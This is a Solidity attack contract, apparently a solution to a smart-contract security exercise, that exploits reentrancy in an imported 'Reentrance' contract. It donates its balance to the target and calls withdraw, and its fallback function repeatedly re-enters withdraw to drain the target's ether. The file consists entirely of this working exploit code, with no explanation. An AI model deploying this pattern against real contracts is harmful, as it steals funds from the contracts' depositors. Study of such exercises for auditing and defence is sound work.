// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        Reentrance reentrance = Reentrance(contractAddress);
        reentrance.donate{value: address(this).balance}(address(this));
        reentrance.withdraw();
    }

    fallback() external payable {
        Reentrance reentrance = Reentrance(contractAddress);
        reentrance.withdraw();
    }
}
